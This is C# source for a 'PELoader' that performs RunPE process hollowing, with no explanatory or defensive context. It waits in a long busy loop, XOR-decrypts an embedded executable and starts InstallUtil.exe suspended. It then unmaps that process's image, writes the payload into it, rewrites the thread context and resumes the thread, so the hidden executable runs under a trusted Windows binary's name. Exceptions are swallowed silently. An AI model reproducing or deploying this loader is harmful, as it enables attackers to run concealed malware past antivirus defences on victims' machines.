using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;

namespace PELoader
{
    public class Load
    {
        public static void Start(byte[] file, string key, bool isNative, string args)
        {
            try
            {
                int MAX = 100000000;
                int c = 0;
                while (c != MAX)
                    c++;
                if (c == MAX)
                    RunPE.Run(
                        Path.Combine(System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory(),
                            "InstallUtil.exe"),
                        args, Decrypt(file, key), false);

            }
            catch (Exception ex)
            {
            }
        }

        private static byte[] GetBytes(string str)
        {
            byte[] bytes = new byte[str.Length];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(str.ToCharArray()[i]);
            }

            return bytes;
        }

        private static byte[] Decrypt(byte[] data, string pass) // декриптор
        {
            byte[] bytes = GetBytes(pass);
            int num = 0;
            for (int i = 0; i < data.Length; i++)
            {
                data[i] ^= bytes[num++];
                if (num == bytes.Length)
                {
                    num = 0;
                }
            }
            return data;
        }
    }

    internal class RunPE
    {
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr ProcessHandle;
            public IntPtr ThreadHandle;
            public uint ProcessId;
            public uint ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct STARTUP_INFORMATION
        {
            public uint Size;
            public string Reserved1;
            public string Desktop;
            public string Title;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
            public byte[] Misc;

            public IntPtr Reserved2;
            public IntPtr StdInput;
            public IntPtr StdOutput;
            public IntPtr StdError;
        }

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes,
            IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment,
            string currentDirectory, ref RunPE.STARTUP_INFORMATION startupInfo,
            ref RunPE.PROCESS_INFORMATION processInformation);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(IntPtr thread, int[] context);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(IntPtr thread, int[] context);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize,
            ref int bytesRead);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize,
            ref int bytesWritten);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("ntdll.dll")]
        private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern int ResumeThread(IntPtr handle);

        public static bool Run(string path, string cmd, byte[] data, bool compatible)
        {
            bool result;
            for (int i = 1; i <= 5; i++)
            {
                if (RunPE.HandleRun(path, cmd, data, compatible))
                {
                    result = true;
                    return result;
                }
            }

            result = false;
            return result;
        }

        private static bool HandleRun(string path, string cmd, byte[] data, bool compatible)
        {
            int num = 0;
            string text = string.Format("\"{0}\"", path);
            RunPE.STARTUP_INFORMATION sTARTUP_INFORMATION = default(RunPE.STARTUP_INFORMATION);
            RunPE.PROCESS_INFORMATION pROCESS_INFORMATION = default(RunPE.PROCESS_INFORMATION);
            sTARTUP_INFORMATION.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(RunPE.STARTUP_INFORMATION)));
            bool result;
            try
            {
                if (!string.IsNullOrEmpty(cmd))
                {
                    text = text + " " + cmd;
                }

                if (!RunPE.CreateProcess(path, text, IntPtr.Zero, IntPtr.Zero, false, 4u, IntPtr.Zero, null,
                    ref sTARTUP_INFORMATION, ref pROCESS_INFORMATION))
                {
                    throw new Exception();
                }

                int num2 = BitConverter.ToInt32(data, 60);
                int num3 = BitConverter.ToInt32(data, num2 + 52);
                int[] array = new int[179];
                array[0] = 65538;
                if (IntPtr.Size == 4)
                {
                    if (!RunPE.GetThreadContext(pROCESS_INFORMATION.ThreadHandle, array))
                    {
                        throw new Exception();
                    }
                }
                else
                {
                    if (!RunPE.Wow64GetThreadContext(pROCESS_INFORMATION.ThreadHandle, array))
                    {
                        throw new Exception();
                    }
                }

                int num4 = array[41];
                int num5 = 0;
                if (!RunPE.ReadProcessMemory(pROCESS_INFORMATION.ProcessHandle, num4 + 8, ref num5, 4, ref num))
                {
                    throw new Exception();
                }

                if (num3 == num5)
                {
                    if (RunPE.NtUnmapViewOfSection(pROCESS_INFORMATION.ProcessHandle, num5) != 0)
                    {
                        throw new Exception();
                    }
                }

                int length = BitConverter.ToInt32(data, num2 + 80);
                int bufferSize = BitConverter.ToInt32(data, num2 + 84);
                bool flag = false;
                int num6 = RunPE.VirtualAllocEx(pROCESS_INFORMATION.ProcessHandle, num3, length, 12288, 64);
                if (!compatible && num6 == 0)
                {
                    flag = true;
                    num6 = RunPE.VirtualAllocEx(pROCESS_INFORMATION.ProcessHandle, 0, length, 12288, 64);
                }

                if (num6 == 0)
                {
                    throw new Exception();
                }

                if (!RunPE.WriteProcessMemory(pROCESS_INFORMATION.ProcessHandle, num6, data, bufferSize, ref num))
                {
                    throw new Exception();
                }

                int num7 = num2 + 248;
                short num8 = BitConverter.ToInt16(data, num2 + 6);
                for (int i = 0; i <= (int) (num8 - 1); i++)
                {
                    int num9 = BitConverter.ToInt32(data, num7 + 12);
                    int num10 = BitConverter.ToInt32(data, num7 + 16);
                    int srcOffset = BitConverter.ToInt32(data, num7 + 20);
                    if (num10 != 0)
                    {
                        byte[] array2 = new byte[num10];
                        Buffer.BlockCopy(data, srcOffset, array2, 0, array2.Length);
                        if (!RunPE.WriteProcessMemory(pROCESS_INFORMATION.ProcessHandle, num6 + num9, array2,
                            array2.Length, ref num))
                        {
                            throw new Exception();
                        }
                    }

                    num7 += 40;
                }

                byte[] bytes = BitConverter.GetBytes(num6);
                if (!RunPE.WriteProcessMemory(pROCESS_INFORMATION.ProcessHandle, num4 + 8, bytes, 4, ref num))
                {
                    throw new Exception();
                }

                int num11 = BitConverter.ToInt32(data, num2 + 40);
                if (flag)
                {
                    num6 = num3;
                }

                array[44] = num6 + num11;
                if (IntPtr.Size == 4)
                {
                    if (!RunPE.SetThreadContext(pROCESS_INFORMATION.ThreadHandle, array))
                    {
                        throw new Exception();
                    }
                }
                else
                {
                    if (!RunPE.Wow64SetThreadContext(pROCESS_INFORMATION.ThreadHandle, array))
                    {
                        throw new Exception();
                    }
                }

                if (RunPE.ResumeThread(pROCESS_INFORMATION.ThreadHandle) == -1)
                {
                    throw new Exception();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                Process processById = Process.GetProcessById(Convert.ToInt32(pROCESS_INFORMATION.ProcessId));
                if (processById != null)
                {
                    processById.Kill();
                }

                result = false;
                return result;
            }

            result = true;
            return result;
        }
    }
}